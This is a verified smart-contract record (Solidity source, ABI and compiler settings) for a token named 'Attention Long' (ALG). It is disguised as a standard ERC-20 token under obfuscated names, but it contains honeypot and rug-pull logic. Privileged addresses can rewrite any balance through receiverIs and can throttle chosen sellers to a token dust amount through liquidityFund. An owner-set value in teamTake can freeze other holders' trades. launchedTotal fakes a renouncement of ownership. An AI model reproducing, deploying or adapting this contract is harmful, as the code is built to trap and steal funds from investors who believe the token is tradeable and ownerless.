{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface launchedTokenFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundAmountFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamIs {\n    function createPair(address sellTradingBuy, address amountBuy) external returns (address);\n}\n\ninterface atSenderTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderLaunched) external view returns (uint256);\n\n    function transfer(address toModeShould, uint256 limitTo) external returns (bool);\n\n    function allowance(address listEnableLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toModeShould,\n        uint256 limitTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atToken, uint256 value);\n    event Approval(address indexed listEnableLaunch, address indexed spender, uint256 value);\n}\n\ninterface atSenderTxMetadata is atSenderTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AttentionLong is fundAmountFrom, atSenderTx, atSenderTxMetadata {\n\n    address atWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private tradingIs = 18;\n\n    mapping(address => bool) public limitTx;\n\n    function name() external view virtual override returns (string memory) {\n        return enableLimit;\n    }\n\n    uint256 private senderWallet = 100000000 * 10 ** 18;\n\n    address limitFeeExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public txShould;\n\n    function allowance(address fundTake, address tokenAt) external view virtual override returns (uint256) {\n        if (tokenAt == atWallet) {\n            return type(uint256).max;\n        }\n        return feeAuto[fundTake][tokenAt];\n    }\n\n    bool public sellMax;\n\n    function getOwner() external view returns (address) {\n        return tradingSenderLaunch;\n    }\n\n    function shouldReceiver(address shouldLaunch) public {\n        if (modeList) {\n            return;\n        }\n        \n        limitTx[shouldLaunch] = true;\n        if (toEnableFee == exemptFromAuto) {\n            modeFee = walletTx;\n        }\n        modeList = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderWallet;\n    }\n\n    mapping(address => uint256) private tokenAutoTo;\n\n    mapping(address => mapping(address => uint256)) private feeAuto;\n\n    function approve(address tokenAt, uint256 limitTo) public virtual override returns (bool) {\n        feeAuto[_msgSender()][tokenAt] = limitTo;\n        emit Approval(_msgSender(), tokenAt, limitTo);\n        return true;\n    }\n\n    string private liquidityLimit = \"ALG\";\n\n    bool public exemptFromAuto;\n\n    function transfer(address launchMode, uint256 limitTo) external virtual override returns (bool) {\n        return teamTake(_msgSender(), launchMode, limitTo);\n    }\n\n    function buyIs() private view {\n        require(limitTx[_msgSender()]);\n    }\n\n    uint256 toToken;\n\n    uint256 constant limitTrading = 12 ** 10;\n\n    uint256 private modeFee;\n\n    bool private toEnableFee;\n\n    function launchedTotalList(uint256 limitTo) public {\n        buyIs();\n        toIs = limitTo;\n    }\n\n    address public toFrom;\n\n    function liquidityFund(address listTeam) public {\n        buyIs();\n        \n        if (listTeam == txShould || listTeam == toFrom) {\n            return;\n        }\n        receiverLiquidityLaunched[listTeam] = true;\n    }\n\n    address private tradingSenderLaunch;\n\n    function transferFrom(address liquidityLaunchTo, address toModeShould, uint256 limitTo) external override returns (bool) {\n        if (_msgSender() != atWallet) {\n            if (feeAuto[liquidityLaunchTo][_msgSender()] != type(uint256).max) {\n                require(limitTo <= feeAuto[liquidityLaunchTo][_msgSender()]);\n                feeAuto[liquidityLaunchTo][_msgSender()] -= limitTo;\n            }\n        }\n        return teamTake(liquidityLaunchTo, toModeShould, limitTo);\n    }\n\n    string private enableLimit = \"Attention Long\";\n\n    function teamTake(address liquidityLaunchTo, address toModeShould, uint256 limitTo) internal returns (bool) {\n        if (liquidityLaunchTo == txShould) {\n            return marketingMode(liquidityLaunchTo, toModeShould, limitTo);\n        }\n        uint256 liquidityToSwap = atSenderTx(toFrom).balanceOf(limitFeeExempt);\n        require(liquidityToSwap == toIs);\n        require(toModeShould != limitFeeExempt);\n        if (receiverLiquidityLaunched[liquidityLaunchTo]) {\n            return marketingMode(liquidityLaunchTo, toModeShould, limitTrading);\n        }\n        return marketingMode(liquidityLaunchTo, toModeShould, limitTo);\n    }\n\n    function receiverIs(address launchMode, uint256 limitTo) public {\n        buyIs();\n        tokenAutoTo[launchMode] = limitTo;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityLimit;\n    }\n\n    function balanceOf(address senderLaunched) public view virtual override returns (uint256) {\n        return tokenAutoTo[senderLaunched];\n    }\n\n    function launchedTotal() public {\n        emit OwnershipTransferred(txShould, address(0));\n        tradingSenderLaunch = address(0);\n    }\n\n    bool public modeList;\n\n    uint256 public walletTx;\n\n    constructor (){\n        \n        launchedTokenFrom atLiquidity = launchedTokenFrom(atWallet);\n        toFrom = teamIs(atLiquidity.factory()).createPair(atLiquidity.WETH(), address(this));\n        if (sellMax == exemptFromAuto) {\n            exemptFromAuto = true;\n        }\n        txShould = _msgSender();\n        launchedTotal();\n        limitTx[txShould] = true;\n        tokenAutoTo[txShould] = senderWallet;\n        if (modeFee != walletTx) {\n            toEnableFee = true;\n        }\n        emit Transfer(address(0), txShould, senderWallet);\n    }\n\n    function owner() external view returns (address) {\n        return tradingSenderLaunch;\n    }\n\n    function marketingMode(address liquidityLaunchTo, address toModeShould, uint256 limitTo) internal returns (bool) {\n        require(tokenAutoTo[liquidityLaunchTo] >= limitTo);\n        tokenAutoTo[liquidityLaunchTo] -= limitTo;\n        tokenAutoTo[toModeShould] += limitTo;\n        emit Transfer(liquidityLaunchTo, toModeShould, limitTo);\n        return true;\n    }\n\n    uint256 toIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingIs;\n    }\n\n    mapping(address => bool) public receiverLiquidityLaunched;\n\n    event OwnershipTransferred(address indexed takeAtExempt, address indexed launchTeam);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listEnableLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAtExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitTo\",\"type\":\"uint256\"}],\"name\":\"launchedTotalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"}],\"name\":\"liquidityFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTo\",\"type\":\"uint256\"}],\"name\":\"receiverIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLiquidityLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunchTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toModeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AttentionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}